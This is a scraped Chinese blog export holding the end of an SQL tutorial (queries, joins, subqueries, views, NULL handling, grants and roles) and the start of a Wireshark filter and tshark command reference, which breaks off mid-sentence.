eg.查询TAB1里面所有学号2300开头学生（Nu\u0026gt;23000）的学生的年级：\nSELECT Grade FROM TAB1 WHERE Nu\u0026gt;23000; 确定范围 WHERE 列名 BETWEEN 最小值 AND 最大值\nWHERE 列名 NOT BETWEEN 最小值 AND 最大值\neg.查询TAB1里面年级在1到3之间的学生的姓名：\nSELECT Ch FROM TAB1 WHERE Grade BETWEEN 1 AND 3; eg.查询学号不在23000到24000之间的学生的姓名：\nSELECT Ch FROM TAB1 WHERE NOT Nu BETWEEN 23000 AND 24000; 确定集合 WHERE 列名 IN (\u0026lsquo;列值1\u0026rsquo;,\u0026lsquo;列值n\u0026rsquo;)\nWHERE 列名 NOT IN (\u0026lsquo;列值1\u0026rsquo;,\u0026lsquo;列值n\u0026rsquo;)\neg.查询学号不是23001也不是23002的学生年级：\nSELECT Grade FROM TAB1 WHERE Nu NOT IN (\u0026#39;23001\u0026#39;,\u0026#39;23002\u0026#39;); 相当于多重条件查询的=语句\n字符匹配 百分号 % 表示任意长度的字符串(类似正则.*)，比如a%b就是以a开头，b结尾的任意长度字符串\n下划线 _ 表示单个字符，比如a_ _ _b（不用空格，这里方便看）是以a开头b结尾的长度为5的字符串\n在ASCII码表里，一个汉字长度为2，需要两个下划线\n反斜杠 \\ 表示转义，跟在 % 和 _ 前面（\\% 、\\_）让他们变成普通字符而非通配符\n使用 ESCAPE \u0026lsquo;符号\u0026rsquo; 设置转义字符，但一般使用反斜杠 根据环境决定要不要加上ESCAPE（有的数据库默认由\\转义）\nWHERE 列名 LIKE \u0026lsquo;字符串\u0026rsquo; ESCAPE \u0026lsquo;\\\u0026rsquo;\nWHERE 列名 NOT LIKE \u0026lsquo;字符串\u0026rsquo; ESCAPE \u0026lsquo;\\\u0026rsquo;\neg.查询TAB1中姓名满足a%i_e的学生的年级：\nSELECT Grade FROM TAB1 WHERE Ch LIKE \u0026#39;a%i_e\u0026#39;; 空值查询 WHERE 列名 IS NULL\nWHERE 列名 IS NOT NULL\neg.查询TAB1中缺少学号的学生的年级：\nSELECT Grade FROM TAB1 WHERE Nu IS NULL; 多重条件查询 WHERE 条件表达式1 AND 条件表达式2\nWHERE 条件表达式1 OR 条件表达式2\n可以把AND和OR组合使用，其中AND优先级大于OR\nGROUP BY 列名 HAVING 条件表达式 用于将查询结果按某一列或多列的值分组，值相等的为一组 目的是细化聚集函数的作用对象，分组后聚集函数将作用于每一个组，每一组都有一个函数值\nGROUP BY 列名 eg.求TAB1表里面各个年级和对应的人数：\nSELECT Grade,COUNT(Ch) FROM TAB1 GROUP BY Grade; 以Grade分组，在每一组中求取Ch的数量\nGROUP BY 列名 HAVING 筛选条件 HAVING用于从组中选择满足条件的组 WHERE用于从基本表或视图中选择满足条件的元组（注意：WHERE子句不可以接聚集函数）\neg.求TAB1表里面各个年级和对应的人数：\nSELECT Grade,COUNT(Ch) FROM .TAB1 GROUP BY Grade HAVING GRADE\u0026gt;=2; 以Grade分组，在每一组中求取Ch的数量\nORDER BY 次序 ORDER BY 列名1 列名n ASC\nORDER BY 列名1 列名n DESC\n如果不设置，默认升序（ASC）\neg.查询TAB1中学生的年级，按照降序排列：\nSELECT Grade FROM TAB1 ORDER BY GRADE DESC; 连接查询 两表连接查询 WHERE 表名1.列名1 比较运算符 表名2.列名2\n当列名在参与连接的各表中唯一时，可省去表名前缀\neg.查询TAB1和TAB2中所有数据，并在一个查询结果里面展示\nSELECT STUDY.TAB1.*,STUDY.TAB2.* FROM STUDY.TAB1,STUDY.TAB2 WHERE TAB1.Nu=TAB2.Nu; 若想获得自然连接，则列举全部属性列，并去掉一个相同的属性列即可。可以将上述SELECT语句改写如下：\nSELECT Ch,Grade,Cla,Hom,STUDY.TAB2.Nu -- 去掉了其中一个Nu FROM STUDY.TAB1,STUDY.TAB2 WHERE TAB1.Nu=TAB2.Nu; eg.在TAB1和TAB2里查询选了英语课，并且是三年级的学生的学号:\nSELECT STUDY.TAB1.Nu FROM STUDY.TAB1,STUDY.\u0026#34;tab2\u0026#34; WHERE CLA=\u0026#39;ENGLISH\u0026#39; AND GRADE=3; 单表连接查询 通过取两个别名，对同一个表进行自连接\neg.查询cla和cla2相同的学生学号：\nSELECT FIRST.*,SECOND.* FROM STUDY.TAB2 FIRST,STUDY.tab2 SECOND WHERE FIRST.CLA=SECOND.CLA2; 外连接查询 左外连接保留左表的所有记录，并尽可能地匹配右表中的记录 右外连接保留右表的所有记录，并尽可能地匹配左表中的记录\n将悬浮元组保留在结果关系中，没有属性值的位置填上NULL\nSELECT 列名 FROM 表名1 LEFT OUTER JOIN 表名2 ON(连接条件)\nSELECT 列名 FROM 表名1 RIGHT OUTER JOIN 表名2 ON(连接条件)\neg.以TAB1为主体，列出每个学生选课cla的结果\nSELECT STUDY.TAB1.Ch,CLA FROM STUDY.TAB1 LEFT OUTER JOIN STUDY.TAB2 ON(STUDY.TAB1.Nu=STUDY.TAB2.Nu); 此时会保留TAB1里面的所有记录，匹配对应的TAB2记录\n多表连接查询 WHERE 表名1.列名1 = 表名2.列名2 AND 表名2.列名2 = 表名3.列名3\n多表连接一般是先进行两个表的连接操作，再将其连接结果与第三个表执行连接\n嵌套查询 查询块：SELECT-FROM-WHERE 嵌套查询：将一个查询块嵌套在另一个查询块的WHERE子句或者HAVING子句 上层的查询块称为外层查询/父查询；下层的查询块称为内层查询/子查询 子查询的SELECT语句中不能使用ORDERBY子句，ORDERBY子句只能对最终查询结果排序\n集合判断IN子查询 WHERE 列名 IN (子查询)\neg.查询alice的年级：\nSELECT GRADE FROM STUDY.TAB1 WHERE CH=\u0026#39;alice\u0026#39;; 查询结果为alice在三年级，再查找三年级的其他学生：\nSELECT CH,NU FROM STUDY.TAB1 WHERE GRADE=3; 上面两个查询结合为嵌套查询：\nSELECT CH,NU FROM STUDY.TAB1 WHERE GRADE IN (SELECT GRADE FROM STUDY.TAB1 WHERE CH=\u0026#39;alice\u0026#39; ); 本例的子查询条件不依赖于父查询，这类子查询称为不相关子查询\n比较运算符子查询 WHERE 列名 比较运算符 (子查询)\n当明确知道子查询结果是单个值而不是集合的时候使用\neg．在SC表中，找出每个学生（Sno）超过他自己选修课程平均成绩（Grade）的课程号（Cno)\nSELECT Sno, Cno FROM SC x -- x是表 SC 的别名，又称为元组变量，可以用来表示 SC 的一个元组 WHERE Grade \u0026gt;= (SELECT AVG(Grade) FROM SC y WHERE y.Sno=x.Sno); 这里必须加上WHERE y.Sno=x.Sno这个条件，此时内外对应的sno才会相同，否则求的不是单个学生的平均成绩，而是所有学生的平均成绩\n本例的子查询条件依赖于父查询，这类子查询称为相关子查询，整个查询称为相关嵌套查询\nANY/ALL子查询 WHERE 列名 比较运算符 ANY/ALL (子查询)\n谓词 语义 与聚集函数或 IN 的等价转换 \u0026gt;ANY 大于子查询结果中的某个值 \u0026gt;MIN \u0026gt;ALL 大于子查询结果中的所有值 \u0026gt;MAX \u0026lt;ANY 小于子查询结果中的某个值 \u0026lt;MAX \u0026lt;ALL 小于子查询结果中的所有值 \u0026lt;MIN \u0026gt;=ANY 大于等于子查询结果中的某个值 \u0026gt;=MIN \u0026gt;=ALL 大于等于子查询结果中的所有值 \u0026gt;=MAX \u0026lt;=ANY 小于等于子查询结果中的某个值 \u0026lt;=MAX \u0026lt;=ALL 小于等于子查询结果中的所有值 \u0026lt;=MIN =ANY 等于子查询结果中的某个值 IN =ALL 等于子查询结果中的所有值（通常无实际意义） \u0026ndash; !=(或\u0026lt;\u0026gt;)ANY 不等于子查询结果中的某个值 \u0026ndash; !=(或\u0026lt;\u0026gt;)ALL 不等于子查询结果中的任何值 NOT IN eg.查询TAB1里面三年级学生学号大于23000的：\nSELECT Ch FROM STUDY.TAB1 WHERE Nu\u0026gt;=ANY (SELECT Nu FROM STUDY.\u0026#34;tab1\u0026#34; WHERE Grade=3 ); EXISTS子查询 EXISTS代表存在量词，对应的为NOT EXISTS\nEXISTS谓词的子查询不返回数据，只返回逻辑\u0026rsquo;true\u0026rsquo;和\u0026rsquo;false\u0026rsquo;\neg1.在SC表中查询至少选修了1号学生选修的全部课程（Cno）的学生的学号（Sno)\n查询学号为 x 的学生，对所有的课程 y，只要 1 号学生选修了课程 y，则 x 也选修了 y。\n令 p 表示\u0026quot;学生 1 号选修了课程 y\u0026quot;\n令 q 表示\u0026quot;学生 x 选修了课程 y\u0026quot;\n则上述查询可以表示为(∀y)p→q\n通过等价转换，可得(∀y)p→q ≡ ¬(∃y(¬(p→q))) ≡ ¬(∃y(¬(¬p∨q))) ≡ ¬∃y(p∧¬q)\n最终用 SQL 实现的表达式 ¬∃y(p∧¬q)，语义：不存在这样的课程 y，学生 1 号选修了 y，而学生 x 没有选修\nSELECT DISTINCT Sno FROM SC SCX WHERE NOT EXISTS (SELECT * -- 由EXISTS引I出的子查询，其目标列表达式通常都用* FROM SC SCY WHERE SCY.Sno=\u0026#39;1\u0026#39; AND NOT EXISTS (SELECT * FROM SC SCZ WHERE SCZ.Sno = SCX.Sno AND SCZ.Cno = SCY.Cno) -- 保证内外指向相同的学生 ); eg2.基于 SC 表，查询选修了全部课程（Course 表）的学生姓名（Student 表）\n令 p 表示\u0026quot;课程 x 被学生 y 选修了\u0026quot;，则有(∀x)p ≡ ¬(∃x(¬p))，语义：查询没有任何课程是其不选修的学生 y\nSELECT Sname FROM Student WHERE NOT EXISTS (SELECT * FROM Course WHERE NOT EXISTS (SELECT * FROM SC WHERE Sno=Student.Sno AND Cno=Course.Cno) ); 集合查询 多个SELECT语句的结果可以进行集合的并（UNION)、交（INTERSECT)、差（EXCEPT） 参加集合操作的各查询结果的列数必须相同，对应项的数据类型也必须相同\nUNION并操作（满足前者或满足后者） UNION合并查询结果时，系统会自动去掉重复元组，若需保留，则采用UNIONALL\neg.在TAB2中查询学号大于等于23003的学生和选择了MATH科目的学生\nSELECT * FROM STUDY.TAB2 WHERE Nu\u0026gt;=23003 UNION SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; INTERSECT交操作（前后都满足） eg.在TAB2中查询选了MATH又选了history的学生\nSELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;history\u0026#39; OR CLA2=\u0026#39;history\u0026#39; INTERSECT SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; EXCEPT差操作（满足前者，不满足后者） eg.在TAB2中查询学号大于23002的学生和选修了MATH的学生的差集\nSELECT * FROM STUDY.TAB2 WHERE Nu\u0026gt;23002 EXCEPT SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; 基于派生表的查询 子查询出现在FROM子句时，子查询将生成临时的派生表，成为主查询的查询对象\nFROM (子查询) AS 别名 (属性列名1,属性列名2)\n如果子查询中没有聚集函数，派生表可以不指定属性列，子查询SELECT子句后面的列名为其默认属性 AS可以省略，但必须为派生表关系指定一个别名\neg1.找出每个学生超过他自己选修课程平均成绩的课程号\nSELECT Sno, Cno FROM SC, (SELECT Sno, Avg(Grade) FROM SC GROUP BY Sno ) AS Avg_sc(avg_sno, avg_grade) WHERE SC.Sno = Avg_sc.avg_sno AND SC.Grade\u0026gt; =Avg_sc.avg_grade; eg2.查询所有选修了1号课程的学生姓名\nSELECT Sname FROM Student, (SELECT Sno FROM SC WHERE Cno=\u0026#39;1\u0026#39; ) AS SC1 WHERE Student.Sno=SC1.Sno; 插入数据\u0026ndash;INSERT语句 插入元组 一般格式 INSERT\nINTO 表名(列名1,列名n)\nVALUES(常量1,常量n); //字符串常量要用单引号\u0026rsquo;\u0026lsquo;括起来\n假设现在有TAB1表，有C1到C4四列，其中C4列是字符串常量： 情况1：明确给出新增元组要在哪些属性上赋值（插入数据包含全部属性列） INSERT INTO TAB1(C1,C2,C3,C4) VALUES(1,2,3,\u0026#39;4\u0026#39;); 情况2：明确给出新增元组要在哪些属性上赋值（插入数据只包含部分属性列） INSERT INTO TAB1(C1,C2,C3) VALUES(1,2,3) 这种情况下C4列会被赋值NULL，如果C4有约束条件NOT NULL则会报错\n情况3：仅指出要在TAB1表上插入元组（插入数据包含全部属性列） INSERT INTO TAB1 VALUES(1,2,3\u0026#39;4\u0026#39;); 这种情况表示要在全部属性列上赋值，插入数据顺序必须和列的顺序对应\n情况4：仅指出要在TAB1表上插入元组（插入数据只包含部分属性列） INSERT INTO TAB1 VALUES(1,2,3,NULL); 这种情况必须明确未赋值的属性列为NULL\n插入子查询结果 一般格式 INSERT\nINTO TAB1(属性列1,属性列2)\n子查询;\neg.假设现有TAB1表（如上），并按C1列分组求C2列的平均值，并存入TAB2表（其中TAB2表的C1列存放 C1，avg_C2列存放C2列的均值)\nINSERT INTO TAB2 (C1, avg_C2) SELECT C1, AVG(C2) FROMTAB1 GROUP BY C1; 修改数据\u0026ndash;UPDATE语句 一般格式 UPDATE 表名\n==SET 列名1=表达式1,列名n=表达式n\nWHERE 条件;==\nWHERE语句若省略，则表示修改表中所有元组\n情况1：修改某一个元组的值 UPDATE TAB1 SET C4=\u0026#39;0\u0026#39; WHERE C1=1; 情况2：修改多个元组的值 UPDATE TAB1 SET C3=C3+1; 情况3：带子查询的修改语句 UPDATE TAB1 SET C4=\u0026#39;0\u0026#39; WHERE C1 IN (SELECT C1 FROM TAB2 WHERE avg_C2=2 ); 删除语句\u0026ndash;DELETE语句 一般格式 DELETE\nFROM 表名\nWHERE 条件;\nWHERE语句若省略，则表示删除表中所有元组\n情况1：删除某一个元组的值 DELETE FROM TAB1 WHERE C1=1; 情况2：修改多个元组的值 DELETE FROM TAB1 情况3：带子查询的修改语句 DELETE FROM TAB1 WHERE C1 IN (SELECT C1 FROM TAB2 WHERE avg_C2=2 ); VIEW 视图 建立视图 一般格式 CREATE VIEW 视图名 (列名1,列名n)\nAS 子查询\nWITH CHECK OPTION;\n若省略视图名后的列名，则该视图由子查询中SELECT的目标列字段组成\n若添加WITH句，则表示对视图进行增删改时要满足子查询中的条件表达式\n在以下情况中必须明确指定组成视图的列名： 1.某个目标列不是单纯的列名，而是聚集函数或列表达式 2.多表连接时选出了几个同名列作为视图的字段 3.需要在视图中为某个列启用新的更合适的名字\n行列子集视图：由单个基本表导出，仅去掉了基本表的某些行和某些列，但保留了主码\n若某些视图是建立在另一个表的全部属性列上的（视图与基本表的各列是一一对应的）那么当修改基本表的结构时，基本表和视图的映像关系会被破坏。这种情况最好在修改基本表后删除该视图，然后重建该视图\n情况1：建立完全视图 eg1.建立C1为1时TAB1的视图\nCREATE VIEW V_TAB1 AS SELECT C1,C2,C3,C4 FROM TAB1 WHERE C1=1; 情况2：建立带有增删改条件的视图 eg2.建立C4为4时TAB1的视图，并且以后每次增删改时都要满足C4=4\nCREATE VIEW V_TAB2 AS SELECT C1,C2,C3,C4 FROM TAB1 WHERE C4=\u0026#39;4\u0026#39; WITH CHECK OPTION; 情况3：由视图新建视图 eg3.建立在一个或多个已定义的视图上\nCREATE VIEW V_TAB3 AS SELECT C1,C2,C3 FROM V_TAB1 WHERE C2=2; 情况4：带有派生数据的视图 减少冗余数据，定义基本表时一般只存放基本数据。当需要使用计算得出的派生数据时，可以设置在视图 中的派生属性列上，也称为虚拟列。带虚拟列的视图也称为带表达式的视图\neg4.建立有派生数据的视图\nCREATE VIEW V_TAB4(C1,new_C2) AS SELECT C1,10+C2 FROM TAB1; 情况5：带有聚集函数和GROUP BY的分组视图 eg5.建立包含聚集函数的分组视图\nCREATE VIEW V_TAB5(C1,avg_C2) AS SELECT C1,AVG(C2) FROM TAB1; GROUP BY C1; 删除视图 DROP VIEW 视图名 CASCADE;\n如果使用了CASCADE级联删除语句，则将把该视图导出的所有视图一并删除\n查询和更新视图 视图定义后，对视图进行查询和更新的语句和语法与基本表相同 视图的查询与更新最终都会转换为对基本表的查询和更新，这一过程也被称为视图消解 一般来说，行列子集视图的查询和更新都可以顺利转换，其他则不一定\n空值 判断属性为空值 这部分和WHERE语句里面空值判断一样啦\n属性 IS NULL;\n属性 IS NOT NULL;\neg.查找TAB1中名字为空的学生：\nSELECT * FROM STUDY.TAB1 WHERE Ch IS NULL; 空值的运算 算数运算 空值与另一个值的算术运算结果为空值\nSELECT 5 + NULL; -- 结果为 NULL SELECT 10 / NULL; -- 结果为 NULL 比较运算 空值与另一个值的比较运算结果为 UNKNOWN\nSELECT 5 = NULL; -- 结果为 UNKNOWN SELECT 5 \u0026lt;\u0026gt; NULL; -- 结果为 UNKNOWN SELECT 5 \u0026gt; NULL; -- 结果为 UNKNOWN 在查询语句中的处理 在查询语句中，只有使WHERE和HAVING子句的选择条件为TRUE的元组才会被选出作为输出结果（即不包括UNKNOWN的情况)\neg1:\nSELECT * FROM employees WHERE salary \u0026gt; 50000 AND commission IS NOT NULL; 这个查询会返回所有工资大于 50000 且佣金不为 NULL 的员工记录\neg2:\nSELECT * FROM employees WHERE commission \u0026lt;\u0026gt; 0; 查询过程中commission可能为NULL，这部分运算后产生UNKNOWN，对应元组会被忽略\n要让所有都能被输出，最好做如下改动：\nSELECT * FROM employees WHERE commission \u0026lt;\u0026gt; 0 OR commission IS NULL; 数据库安全 授权 授予用户权限 GRANT 权限 ON 对象类型 对象名 TO 用户名 [WITH GRANT OPTION];\n权限：查询权限 SELECT，全部操作权限 ALL PRIVILEGES\n对象类型：TABLE/VIEW\n对象名：表和视图的名称\n用户名：可以指定用户，也可以全体用户PUBLIC\n如果没有WITH GRANT OPTION语句，那么用户不能传播这个权限\nSQL不允许循环授权，被授权者不能把权限传递给授权者或其祖先\neg.假设我们有一个名为employees的表，现在想让用户user_A只能查询这张表\nGRANT SELECT ON TABLE employees TO user_A; 如果要让A还能把权限授权给别人：\nGRANT SELECT ON TABLE employees TO user_A WITH GRANT OPTION; 收回用户权限 REVOKE 权限 ON 对象类型 对象名 FROM 用户名 [CASCADE/RESTRICT];\nCASCADE：级联回收，把用户传播出去的权限一并收回\nRESTRICT：受限回收，如果用户传播过该权限，回收会失败（默认行为）\neg.收回user_A的权限\nREVOKE SELECT ON TABLE employees FROM user_A; 创建数据库模式的权限 对创建数据库模式一类的数据库对象的授权在数据库管理员创建用户的时候实现\nCREATE USER 用户名 [WITH DBA|RESOURCE|CONNECT];\nDBA：可以创建新用户、模式、表、视图等，还可以把这些权限授予其他用户\nRESOURCE：可以创建表、视图，但是不能创建新的模式和用户\nCONNECT：只能登录数据库，或者被授予权限后操作\n数据库角色 角色是权限的集合，可以为一组相同权限的用户创建同一个角色，使用角色管理权限，简化授权过程\n创建角色 CREATE ROLE 角色名;\n给角色添加角色/用户 GRANT 角色 TO 某角色/某用户 [WITH ADMIN OPTION];\n给角色授权 GRANT 权限 ON 对象类型 对象名 TO 角色；\n收回角色权限 REVOKE 权限 ON 对象类型 对象名 FROM 角色;\n","date":"2025-06-03T01:14:02+08:00","permalink":"https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/","title":"快速入门SQL"},{"content":"wireshark过滤语法 运算符 比较运算符 操作符 别名 类C风格 描述 示例 eq any_eq == 等于 ip.src == 10.0.0.5 ne all_ne != 不等于 ip.src != 10.0.0.5 all_eq === 全等 ip.src === 10.0.0.5 any_ne !== 不全等 ip.src !== 10.0.0.5 gt \u0026gt; 大于 frame.len \u0026gt; 10 lt \u0026lt; 小于 frame.len \u0026lt; 128 ge \u0026gt;= 大于或等于 frame.len ge 0x100 le \u0026lt;= 小于或等于 frame.len \u0026lt;= 0x20 contains 协议、字段或切片包含某个值 sip.To contains \u0026ldquo;a1762\u0026rdquo; matches ~ 右侧的正则表达式将被用来匹配左侧的字符串 http.host matches \u0026ldquo;acme.(org|com|net)\u0026rdquo; 等于（==）和全等（===）的区别：\n== 是一种宽松的比较，只要有一个值匹配即可（any if more than one）\n=== 是一种严格的比较，所有可能的值都必须匹配（all if more than one）\n同一个包，使用等于（==）可以过滤出源或目的端口为80报文，使用全等（===）则会匹配源目的端口都为80的报文\nip.addr == 10.0.0.0/8 等价于 ip.src==10.0.0.0/8 || ip.dst==10.0.0.0/8 ip.addr === 10.0.0.0/8 等价于 ip.src==10.0.0.0/8 \u0026amp;\u0026amp; ip.dst==10.0.0.0/8 逻辑运算符 操作符 类C风格 描述 示例 and \u0026amp;\u0026amp; 逻辑与 ip.src == 10.0.0.5 and tcp.flags.fin == 1 or || 逻辑或 ip.src == 10.0.0.5 or ip.src == 192.1.1.1 xor ^^ 逻辑异或，能且只能满足其中一个 tr.dst[0:3] == 0.6.29 xor tr.src[0:3] == 0.6.29 not ! 逻辑非 ! udp […] 不涉及 [a:b]：从第a个字符开始取b个字符 http.request.method**[0:3]**==\u0026ldquo;GET\u0026rdquo; in 不涉及 匹配集合内的元素，代替== http.request.method in {\u0026ldquo;HEAD\u0026rdquo;, \u0026ldquo;GET\u0026rdquo;} 函数 函数 描述 upper 将字符串字段转换为大写 lower 将字符串字段转换为小写 len 返回字符串字段或字节字段的字节长度 count 返回帧中字段的出现次数 string 将非字符串字段转换为字符串 vals 将字段值转换为其值字符串（如果有） dec 将无符号整数字段转换为十进制字符串 hex 将无符号整数字段转换为十六进制字符串 max 返回参数的最大值 min 返回参数的最小值 abs 返回参数的绝对值 upper()、lower() 可以使用这两个函数，将字符串转化为大小写，再进行正则匹配，做到不区分大小写的功能\nlower(http.server) ~ \u0026#34;apache\u0026#34; //过滤HTTP响应头的server字段为apache的 upper(http.request.method) ~ \u0026#34;post|get\u0026#34; //过滤http请求方法为POST或GET len() len()函数将返回字段的字节大小，因此可以和比较操作符配合使用，过滤某个报文字段符合大小要求的报文\nlen(http.request.uri) \u0026gt;= 10 //过滤http头部的URI字段，大于等于10字节的报文 len(http.host) \u0026gt;= 20 //过滤HTTP主机名大于等于20字节的报文 string() 当字段为非字符串类型，而又想转换为字符串字段再进行正则匹配时，很方便\nstring(ip.addr) ~ \u0026#34;^10|^11\u0026#34; //过滤IP为10网段开头或者23网段开头的IP string(ip.dst) matches r\u0026#34;^172\\.(1[6-9]|2[0-9]|3[0-1])\\.[0-9]{1,3}\\.255\u0026#34; //匹配目的IP中以255结尾的IP地址(172.16到172.31) max()、min() max()和min()接受相同类型的任意数量的参数，并分别返回集合中最大/最小的参数\nmax(tcp.srcport,tcp.dstport) \u0026lt;= 1024 //过滤tcp源端口、目的端口，最大不能超过1024的报文 min(tcp.srcport+tcp.dstport) \u0026gt;= 1024 //过滤tcp源端口+目的端口大于等于1024的报文 过滤IP 1）源地址为192.168.0.1的包\nip.src == 192.168.0.1 2）目的地址为192.168.0.1的包\nip.dst == 192.168.0.1 3）源地址或目的地址是192.168.0.1的包\nip.addr == 192.168.0.1 要原地址和目标地址一样就用===\n4）排除上述包\n!(表达式) 过滤协议 1）仅捕获某种协议的包\n直接写协议名即可，如http（区分大小写）\n2）捕获多种协议的包\n使用逻辑或\nhttp or telent 3）排除某种协议的包\n使用逻辑非\nnot http ! http 过滤端口（需要指明协议） 1）捕获某一端口的包\ntcp.port == 80 2）捕获多端口的包\n可以用and来表示多端口并列\ntcp.port == 80 and 8080 也可以用比较运算符\nudp.port \u0026gt;= 2048 过滤长度、内容 1）长度（数据段的长度）\nudp.length \u0026gt;= 30 //udp的payload长度 http.content_length \u0026lt;= 20 //http消息体长度 2）数据包内容\n使用matches/contains\n过滤时间 frame.time \u0026gt;= \u0026#34;Apr 16, 2021 06:00:00.0\u0026#34; \u0026amp;\u0026amp; frame.time \u0026lt;= \u0026#34;Apr 16, 2021 06:59:00.0\u0026#34; frame.time \u0026gt; \u0026#34;2024-04-11 11:00:00\u0026#34; and frame.time \u0026lt; \u0026#34;2024-04-11 11:01:00\u0026#34; 注意：时间是字符串，要用双引号括起来\ntshark基本命令 -r \u0026ndash; 从一个已有的捕获文件读取数据包进行分析 **-r 111.pcap：**从名为 111.pcap 的文件中读取数据包并简略打印出来\neg:\n1.837951 192.168.1.12 -\u0026gt;192.168.1.5 TCP 72 8080 -\u0026gt; 45940 [FIN, ACK] Seq=1 ... ​ 时间戳 原IP 目标IP 协议 数据包长度 源端口 目标端口 报文标头信息\n-n/-N \u0026ndash; 禁止反向解析 -n \u0026ndash; 禁用域名解析，不对 IP 地址和端口号进行名称解析 默认情况下，tshark 会尝试将捕获到的 IP 地址解析为主机名（192.168.1.1-\u0026gt;exaple.com），同时也会将端口号转换为服务名称（如 80 变成 http，443 变成 https 等）\n通过使用 -n 参数，可以避免这些解析，直接显示原始的 IP 地址和端口号\neg:\ntshark -r file.pcap //直接输出 192.168.1.1 -\u0026gt; example.com 80 tshark -n -r file.pcap //-n输出 192.168.1.1 -\u0026gt; 93.184.216.34 80 -N \u0026ndash; 精准控制解析哪些层级 格式：-N \u0026lt;反向解析flag1\u0026gt; -N \u0026lt;反向解析flag2\u0026gt;\u0026hellip;\nflag取值 含义 d 对于DNS包启用解析 m 启用MAC地址解析 n 启用网络地址解析 N 使用外部解析器（例如DNS）进行网络地址解析，n需要被同时启用才有效果 t 启用传输层端口解析 v 启用VLAN ID的名称解析 eg：\ntshark -r file.pcap //直接输出 1.837951 192.168.1.12 -\u0026gt; 192.168.1.5 TCP 72 45940 -\u0026gt; 80 [FIN, ACK] Seq=1 Ack=2 ... tshark -N t -r file.pcap //-N t(解析传输层端口)输出 1.837951 192.168.1.12 -\u0026gt; 192.168.1.5 TCP 72 45940 -\u0026gt;(http)80 [FIN, ACK] Seq=1 Ack=2 ... ↑ -T \u0026ndash; 指定输出格式 **-T fields：**仅输出指定的字段（需配合 -e 使用）\n**-T text：**以普通文本格式输出（默认）\n**-T json：**以 JSON 格式输出\n**-T jsonraw：**以 JSON（包含原始数据）格式输出\n**-T ek：**以 ElasticSearch 格式输出\n-e \u0026ndash; 指定显示数据包中的特定字段 格式：-e \u0026ldquo;字段1\u0026rdquo; -e \u0026ldquo;字段2\u0026rdquo;\u0026hellip;\n**ip.src：**显示源 IP 地址\n**ip.dst：**显示目标 IP 地址\n**http.host：**显示 HTTP 请求中的主机名\n**http.request.uri：**显示 HTTP 请求中的 URI（即请求的 URL 路径）\n**usbhid.data：**只提取USB HID 设备数据\n**frame.number：**显示数据包的报文帧数\n**frame.time：**显示数据包捕获的时间戳\n**frame.len：**显示数据包的长度\neg:\ntshark -n -r file.pcap -e \u0026#34;frame.number\u0026#34; -e \u0026#34;ip.addr\u0026#34; -e \u0026#34;tcp.port\u0026#34; -e tcp -T fields //输出报文帧数、ip地址、端口、tcp协议的字段 1 192.168.1.12,192.168.1.8 37546,80 Transmission Control Protocol,SrcPort: ... 报文帧数 ip地址 端口 tcp协议的字段 -Y \u0026ndash; 筛选过滤报文 格式：-Y \u0026ldquo;过滤条件\u0026rdquo;\n用来过滤分析符合过滤表达式的报文，相当于wireshark最上面的过滤筛选栏功能\neg:\ntshark -n -r \u0026lt;filename\u0026gt; -Y \u0026#34;http.host == \u0026#34;web-server1\u0026#34;\u0026#34; //通过http.host过滤 tshark -n -r http-keep-alive.pcap -Y \u0026#34;tcp.flags.syn==1\u0026amp;\u0026amp;tcp.flags.ack==0\u0026#34; //过滤第一次握手的请求 -E \u0026ndash; 设置输出的控制字段 通过-T参数来输出特定格式时，可以配合-E参数来设置一些选项\n参数选项 默认 含义 bom=y|n n 在输出前加上UTF-8字节顺序标记（十六进制ef、bb、bf） header=y|n n 打印一个使用-e作为输出第一行的字段名称头部 separator=/t|/s|\u0026lt;character\u0026gt; /t 设置字段分隔符，默认为/t，可以指定/s，即单个空格，或者自定义的其它字符 occurrence=f|l|a a 打印每个字段的第一次(f)/最后一次(l)/或所有出现的内容(a) aggregator=,|/s|\u0026lt;character\u0026gt; , 设置用于每个字段内的分割字符 quote=d|s|n n 设置用于环绕字段的引号字符 n是null，无设置\neg:\ntshark -n -r file.pcap -E header=y -E occurrence=l -Y \u0026#39;icmp.seq==21\u0026#39; -e \u0026#39;icmp.seq\u0026#39; ... -T fields |column -t // -E occurrence=l：包通过IPIP封装，occurrence=l指定输出外层IP // -Y \u0026#39;icmp.seq==21\u0026#39;：指定icmp.seq等于21的ICMP包 // | column -t：将输出通过管道传输给 column 命令，使结果以表格的形式对齐 icmp.seq ip.src ip.dst ip 21 114.132.116.32 113.145.123.23 Internet Protocol Version 4，Src:，Dst: -2 \u0026ndash; 二次依赖分析 没有2以外的参数\ntshark会根据上下文报文的依赖关系（tshark称之为two-pass，即进行两次分析），来显示相关报文关联信息，如：response in frame #、reply in frame、TCP Port numbers reused\n-i \u0026ndash; 指定要捕获数据的网络接口 **-i eth0：**表示从 eth0 网络接口捕获数据包\n**-i wlan0：**表示从无线网卡 wlan0 捕获数据包\n**-i any：**表示捕获所有接口的流量\n**-：**表示从标准输入（stdin）捕获数据流\n-f \u0026ndash; 应用捕获过滤器，只捕获特定的流量 **-f \u0026quot;tcp\u0026quot;：**只捕获 TCP 流量\n**-f \u0026quot;port 80\u0026quot;：**只捕获端口为 80（HTTP）的流量\n**-f \u0026quot;src host 192.168.1.1\u0026quot;：**只捕获源地址为 192.168.1.1 的流量\n-w \u0026ndash; 将捕获的数据包写入到文件中 **-w output.pcap：**将捕获的数据包保存到 output.pcap 文件\n**-：**将捕获的内容输出到标准输出（stdout）\noptions \u0026ndash; 其他可选参数 **-V：**显示详细的包信息\n**-c \u0026lt;count\u0026gt;：**捕获指定数量的包后停止\n**-n：**禁止域名解析，使用 IP 地址而不是主机名显示\n\u0026lt;filter\u0026gt; 指定显示过滤器 如果要用过滤器，一定要放到最后\n**ip.addr == 192.168.1.1：**仅显示源或目标地址为 192.168.1.1 的包。\n**tcp.port == 443：**仅显示端口为 443 的 TCP 数据包（通常用于 HTTPS 流量）。\n**http：**仅显示 HTTP 